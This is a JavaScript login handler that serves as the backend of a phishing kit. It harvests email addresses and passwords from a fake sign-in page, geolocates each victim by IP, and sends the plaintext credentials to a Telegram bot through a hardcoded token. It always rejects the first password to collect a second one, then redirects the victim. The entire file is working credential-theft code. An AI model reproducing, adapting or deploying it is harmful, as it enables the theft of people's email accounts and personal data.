// api/login.js
// ============================================================
//  TELEGRAM CONFIG – CHANGE THESE!
// ============================================================
const BOT_TOKEN = '8969946726:AAHVMCm5YcPlhl09v3cwy85nLpgamhxX21A';
const CHAT_ID = '-5452025915';
// ============================================================

// In-memory store (resets on cold start – for demo only)
const attempts = {};
const firstPasswords = {};

// ============================================================
//  TELEGRAM SENDER
// ============================================================
async function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
    };
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(data),
        });
    } catch (e) {
        console.error('Telegram error:', e);
    }
}

// ============================================================
//  HELPERS
// ============================================================
function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        for (const ip of ips) {
            if (ip && !ip.startsWith('127.') && !ip.startsWith('::1')) return ip;
        }
    }
    return req.socket?.remoteAddress || 'UNKNOWN';
}

async function getGeoInfo(ip) {
    if (!ip || ip === 'UNKNOWN') return null;
    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,timezone`);
        const data = await res.json();
        if (data.status === 'success') return data;
    } catch (e) {}
    return null;
}

function getBrowserInfo(ua) {
    let browser = 'Unknown', os = 'Unknown';
    if (/Windows/i.test(ua)) os = 'Windows';
    else if (/Macintosh/i.test(ua)) os = 'macOS';
    else if (/Linux/i.test(ua)) os = 'Linux';
    else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
    else if (/Android/i.test(ua)) os = 'Android';
    if (/Chrome/i.test(ua)) browser = 'Chrome';
    else if (/Firefox/i.test(ua)) browser = 'Firefox';
    else if (/Safari/i.test(ua)) browser = 'Safari';
    else if (/Edge/i.test(ua)) browser = 'Edge';
    else if (/Opera/i.test(ua)) browser = 'Opera';
    else if (/MSIE|Trident/i.test(ua)) browser = 'Internet Explorer';
    return { browser, os };
}

function getProviderLink(email) {
    const parts = email.split('@');
    if (parts.length < 2) return '#';
    const domain = parts[1].toLowerCase();
    const providers = {
        'gmail.com': 'https://mail.google.com',
        'googlemail.com': 'https://mail.google.com',
        'yahoo.com': 'https://login.yahoo.com',
        'outlook.com': 'https://outlook.live.com',
        'hotmail.com': 'https://outlook.live.com',
        'live.com': 'https://outlook.live.com',
        'aol.com': 'https://login.aol.com',
        'protonmail.com': 'https://mail.protonmail.com',
        'icloud.com': 'https://www.icloud.com/mail',
    };
    return providers[domain] || '#';
}

// ============================================================
//  MAIN HANDLER
// ============================================================
module.exports = async (req, res) => {
    // CORS – allow all origins for testing
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    try {
        const body = req.body || {};
        const { action, email, password, remember } = body;

        // ---------- EMAIL STEP ----------
        if (action === 'email') {
            if (!email || !email.includes('@')) {
                return res.status(400).json({ error: 'Invalid email' });
            }
            // Reset attempts for this email
            if (!attempts[email]) attempts[email] = 0;
            delete firstPasswords[email];
            return res.status(200).json({ success: true });
        }

        // ---------- PASSWORD STEP ----------
        if (action === 'password') {
            if (!email || !email.includes('@')) {
                return res.status(400).json({ error: 'Invalid email' });
            }
            if (password === undefined || password === null) {
                return res.status(400).json({ error: 'Password required' });
            }

            const ip = getClientIP(req);
            const userAgent = req.headers['user-agent'] || 'Unknown';
            const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
            const geo = await getGeoInfo(ip);
            const location = geo ? `${geo.city}, ${geo.regionName}, ${geo.country}` : 'Unknown';
            const isp = geo?.isp || 'Unknown';
            const timezone = geo?.timezone || 'Unknown';
            const browserInfo = getBrowserInfo(userAgent);
            const provider = email.split('@')[1] || 'unknown';
            const providerLink = getProviderLink(email);
            const acceptLanguage = req.headers['accept-language'] || 'Unknown';
            const referer = req.headers['referer'] || 'Direct access';
            const host = req.headers['host'] || 'Unknown';
            const requestUri = req.url || 'Unknown';

            // Get attempt count
            const attemptCount = attempts[email] || 0;

            // Store first password on first attempt
            if (attemptCount === 0) {
                firstPasswords[email] = password;
            }

            const newAttemptCount = attemptCount + 1;
            attempts[email] = newAttemptCount;

            // --- Send Telegram notification for this attempt ---
            let msg = `🔐 <b>🔑 New Login Attempt</b>\n`;
            msg += `────────────────────────\n`;
            msg += `📧 <b>Email:</b> <code>${email}</code>\n`;
            msg += `🔑 <b>Password:</b> <code>${password}</code>\n`;
            msg += `🕒 <b>Time:</b> ${timestamp}\n`;
            msg += `────────────────────────\n`;
            msg += `🌍 <b>IP:</b> <code>${ip}</code>\n`;
            msg += `📍 <b>Location:</b> ${location}\n`;
            msg += `🏢 <b>ISP:</b> ${isp}\n`;
            msg += `🕰️ <b>Timezone:</b> ${timezone}\n`;
            msg += `📱 <b>Device:</b> ${userAgent}\n`;
            msg += `💻 <b>Browser:</b> ${browserInfo.browser}\n`;
            msg += `🖥️ <b>OS:</b> ${browserInfo.os}\n`;
            msg += `────────────────────────\n`;
            msg += `📎 <b>Provider:</b> ${provider}\n`;
            if (providerLink !== '#') msg += `🔗 <b>Login link:</b> <a href='${providerLink}'>${providerLink}</a>\n`;
            msg += `🔁 <b>Remember me:</b> ${remember ? 'Yes' : 'No'}\n`;
            msg += `────────────────────────\n`;
            msg += `🌐 <b>Accept-Language:</b> ${acceptLanguage}\n`;
            msg += `🔗 <b>Referer:</b> ${referer}\n`;
            msg += `🏠 <b>Host:</b> ${host}\n`;
            msg += `📄 <b>Request URI:</b> ${requestUri}\n`;
            msg += `────────────────────────\n`;
            msg += `Attempt #${newAttemptCount} of 2`;

            await sendTelegram(msg);

            // --- SECOND ATTEMPT: success + summary + redirect ---
            if (newAttemptCount >= 2 && firstPasswords[email]) {
                const firstPw = firstPasswords[email];

                // Send summary Telegram
                let summary = `⚠️ <b>🚨 TWO FAILED ATTEMPTS 🚨</b>\n`;
                summary += `═══════════════════════════\n`;
                summary += `📧 <b>Email:</b> <code>${email}</code>\n`;
                summary += `🔑 <b>First Password:</b> <code>${firstPw}</code>\n`;
                summary += `🔑 <b>Second Password:</b> <code>${password}</code>\n`;
                summary += `────────────────────────\n`;
                summary += `🕒 <b>Time of second:</b> ${timestamp}\n`;
                summary += `🌍 <b>IP:</b> <code>${ip}</code>\n`;
                summary += `📍 <b>Location:</b> ${location}\n`;
                summary += `🏢 <b>ISP:</b> ${isp}\n`;
                summary += `📱 <b>Device:</b> ${userAgent}\n`;
                summary += `💻 <b>Browser:</b> ${browserInfo.browser}\n`;
                summary += `🖥️ <b>OS:</b> ${browserInfo.os}\n`;
                summary += `────────────────────────\n`;
                summary += `🌐 <b>Accept-Language:</b> ${acceptLanguage}\n`;
                summary += `🔗 <b>Referer:</b> ${referer}\n`;
                summary += `🏠 <b>Host:</b> ${host}\n`;
                summary += `📄 <b>Request URI:</b> ${requestUri}\n`;
                summary += `═══════════════════════════\n`;
                summary += `⚠️ <b>ACTION REQUIRED</b> – Check credentials!`;

                await sendTelegram(summary);

                // Clean up
                delete attempts[email];
                delete firstPasswords[email];

                // ✅ SECOND ATTEMPT – return redirect (success in the flow)
                return res.status(200).json({ redirect: '/dashboard.html' });
            }

            // ❌ FIRST ATTEMPT – return 401 with error message
            // This triggers the sleek error in your frontend (shake + friendly message)
            return res.status(401).json({ error: 'Incorrect password. Please try again.' });
        }

        // Invalid action
        return res.status(400).json({ error: 'Invalid request: missing action or parameters' });

    } catch (error) {
        console.error('Unhandled error:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
};
